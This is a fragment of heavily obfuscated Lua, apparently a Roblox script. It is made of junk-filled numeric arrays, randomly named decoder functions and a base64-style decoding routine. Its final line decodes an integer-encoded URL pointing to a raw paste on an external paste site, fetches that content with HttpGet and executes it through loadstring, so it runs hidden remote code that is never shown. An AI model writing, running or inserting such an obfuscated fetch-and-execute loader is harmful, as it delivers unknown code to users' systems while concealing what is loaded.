,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})})
function xgRcZlSylxivXncbNXbxTxBXZmATGTajdBzCeGNoAOxzsaRqyWCkbGGVxq(data) m=string.sub(data, 0, 55) data=data:gsub(m,jwUVJKBTvwAfDgmlXHrTF({}))

data = string.gsub(data, jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})})..b..jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}), jwUVJKBTvwAfDgmlXHrTF({})) return (data:gsub(jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}), function(x) if (x == jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})})) then return jwUVJKBTvwAfDgmlXHrTF({}) end local r,f=jwUVJKBTvwAfDgmlXHrTF({}),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}) or jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})})) end return r; end):gsub(jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}), function(x) if (#x ~= 8) then return jwUVJKBTvwAfDgmlXHrTF({}) end local c=0 for i=1,8 do c=c+(x:sub(i,i)==jwUVJKBTvwAfDgmlXHrTF({DZCPhWWXpmQeFrIZsvtknPRvArcrmFrRqczu({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}) and 2^(8-i) or 0) end return string.char(c) end)) end


 


function dtelFcbdDzLpwCotOmlbdgWOTOYXAqTSRyiOPyfNHYzbzGpmIhMgiKEpVvBAtOZcuKRhuOE(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


function qrEdAOuLwDSmGdmWAVKhKiVnCldqfhsZw(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


function JOzZEZOnGBFUAjsZQZZfWBRGXXOfEyQDByHCjtCQUxnuJDzudBYjWIpoDznDmfrRtdCFBknSJ(code)res=qrEdAOuLwDSmGdmWAVKhKiVnCldqfhsZw({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


loadstring(game:HttpGet(JOzZEZOnGBFUAjsZQZZfWBRGXXOfEyQDByHCjtCQUxnuJDzudBYjWIpoDznDmfrRtdCFBknSJ({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10710,12705,4830,10185,11760,11760,4935,5565,8085,5250,12810,9450,7875,8085,6825,4935,11970,10185,12495}), true))();
